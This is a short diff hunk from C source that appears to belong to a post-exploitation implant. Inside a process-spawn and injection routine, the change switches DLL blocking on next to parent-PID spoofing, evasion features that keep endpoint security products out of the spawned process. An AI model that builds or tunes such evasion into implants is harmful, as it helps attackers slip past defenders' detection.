@@ -2223,7 +2223,7 @@ void mod_spawn(Buffer *out, const unsigned char *args, DWORD args_len) {
     opts.spawnTo    = wSpawnTo;
     opts.ppidSpoof  = (_spawn_ppid != 0) ? TRUE : FALSE;
     opts.spoofPid   = _spawn_ppid;
-    opts.blockDlls  = FALSE;
+    opts.blockDlls  = TRUE;
     opts.waitForCompletion = FALSE;
 
     INJECT_RESULT result;
